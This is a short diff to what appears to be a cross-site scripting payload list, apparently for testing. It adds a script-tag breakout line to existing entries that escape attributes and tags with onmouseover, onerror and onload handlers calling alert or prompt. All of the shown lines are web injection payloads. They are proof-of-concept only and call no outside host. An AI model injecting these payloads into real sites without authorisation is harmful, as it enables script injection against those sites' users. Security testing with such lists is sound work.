@@ -6,6 +6,7 @@
 m"onmouseover="prompt(-11)
 n'onmouseover='prompt(-12)
 <video><source src=x onerror=alert(-2)></video>
+'"></script><script>alert(0)</script>
 '"></script><svg onload=prompt(-3)>
 '"><img src=x onerror=alert(-31)>
 '"></script><video><source src=x onerror=alert(-4)></video>
